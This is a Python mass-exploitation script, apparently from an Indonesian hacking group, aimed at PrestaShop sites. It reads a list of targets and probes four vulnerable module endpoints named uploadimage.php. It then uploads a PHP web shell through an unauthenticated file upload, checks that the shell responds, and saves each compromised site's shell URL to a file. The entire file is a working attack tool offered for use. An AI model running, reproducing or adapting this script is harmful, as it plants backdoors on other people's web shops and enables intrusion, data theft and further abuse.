# C0delabs
# jan ubah copyright ea hehe
# Iseng Project c0delabs.com
# Visit c0delabs.com
# Mass Exploit prestashop
# usage prestashop.py list.txt
# result list di prestashop-shell.txt

import requests
import sys
import time
import re
from termcolor import colored

def read():
	try:
		if len(sys.argv) > 1:
			ser = sys.argv[1]
		else:
			print("Masukan nama List dengan benar")
			sys.exit()
		return open(ser, "r").readlines()
	except IOError:
		print("File Not valid")
		sys.exit()
def green(str):
  return colored(str, "green")

def blue(str):
  return colored(str, "blue")

def red(str):
  return colored(str, "red")

def payload():
	payloads = [
	'modules/columnadverts/uploadimage.php',
	'modules/homepageadvertise/uploadimage.php',
	'modules/productpageadverts/uploadimage.php',
	'modules/simpleslideshow/uploadimage.php'
	]
	return payloads
def save(sites):
	s = open("prestashop-shell.txt", "a+")
	s.write(sites+"\n")
	return s
def main():
	try:
		list_sites = read()
		for x in list_sites:
			sites = x.rstrip()
			for payloads in payload():
				try:
					header = {
						'user-agent': ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5)'
                          'AppleWebKit/537.36 (KHTML, like Gecko)'
                          'Chrome/45.0.2454.101 Safari/537.36'),
                          'referer': sites
                          }

					response = requests.get(sites+payloads, headers=header, timeout=15).content.decode('utf-8')
					if "error" in response:
						print(green("[+] Website or Modules vuln => {}".format(sites+payloads)))
						print(blue("[?] Try to upload shell ..."))
						time.sleep(1)
						files = {'userfile' : open('up.php', 'rb')}
						url = sites+payloads
						r = requests.post(url, files=files, timeout=5)
						if "success" in r.content.decode('utf-8'):
							print(blue("[?] Cek shell ..."))
							shell = url.replace("uploadimage.php", "")+"slides/up.php"
							cek_shell = requests.get(shell).status_code
							if cek_shell == 200:
								save(shell)
								print(green("[+] sukses upload shell => {}".format(shell)))
							else:
								print(red("[-] Tidak di temukan coba manual :( => {}".format(shell)))
						else:
							print(red("[-] Failed To Upload shell :("))
					else:
						
						print(red("[-] Website or modules not vuln => {}".format(sites+payloads)))

				except Exception as e:
					print(red("[!] Error tidak di ketahui => {}".format(sites)))
	except KeyboardInterrupt as e:
		print("[!] Ctrl + C detect exit ...")
		sys.exit()

if __name__ == "__main__":
	main()